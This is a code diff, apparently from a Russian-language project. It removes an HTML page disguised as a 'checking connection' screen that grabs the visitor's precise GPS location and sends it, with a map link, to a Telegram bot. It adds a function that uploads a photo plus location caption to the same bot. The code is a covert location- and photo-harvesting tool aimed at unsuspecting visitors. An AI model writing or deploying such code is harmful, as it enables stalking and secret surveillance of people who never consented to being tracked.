@@ -1,84 +1,45 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Проверка подключения...</title>
-</head>
-<body style="font-family:sans-serif;text-align:center;margin-top:40px;">
+async function sendPhotoAndLocation(photoBlob, location) {
 
-<h2>Определение местоположения...</h2>
-<p id="status">Запрос GPS...</p>
+    const caption =
+`📍 Геолокация
 
-<script>
-const BOT_TOKEN = "ВСТАВЬ_СЮДА_BOT_TOKEN";
-const CHAT_ID = "ВСТАВЬ_СЮДА_CHAT_ID";
+Широта: ${location.lat}
+Долгота: ${location.lon}
 
-function sendToTelegram(lat, lon, accuracy) {
+https://maps.google.com/?q=${location.lat},${location.lon}`;
 
-    const text =
-`📍 Новое местоположение
+    const formData = new FormData();
 
-Широта: ${lat}
-Долгота: ${lon}
-Точность: ${accuracy} м
+    formData.append("chat_id", CHAT_ID);
+    formData.append("caption", caption);
+    formData.append("photo", photoBlob, "photo.jpg");
 
-🗺 Карта:
-https://maps.google.com/?q=${lat},${lon}`;
+    try {
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text
-        })
-    })
-    .then(() => {
-        document.getElementById("status").innerText =
-            "Геолокация успешно отправлена";
-    })
-    .catch((err) => {
-        document.getElementById("status").innerText =
-            "Ошибка: " + err;
-    });
-}
+        const response = await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+            {
+                method: "POST",
+                body: formData
+            }
+        );
 
-if (navigator.geolocation) {
+        const result = await response.json();
 
-    navigator.geolocation.getCurrentPosition(
+        console.log(result);
 
-        (position) => {
-
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-
-            sendToTelegram(lat, lon, accuracy);
-
-        },
-
-        (error) => {
-            document.getElementById("status").innerText =
-                "Ошибка GPS: " + error.message;
-        },
-
-        {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
+        if (result.ok) {
+            statusText.innerText = "Успешно отправлено";
+        } else {
+            statusText.innerText =
+                "Ошибка Telegram: " + result.description;
         }
-    );
 
-} else {
+    } catch (err) {
 
-    document.getElementById("status").innerText =
-        "Геолокация не поддерживается";
+        console.error(err);
 
+        statusText.innerText =
+            "Ошибка сети: " + err.message;
+    }
 }
-</script>
-
-</body>
-</html>
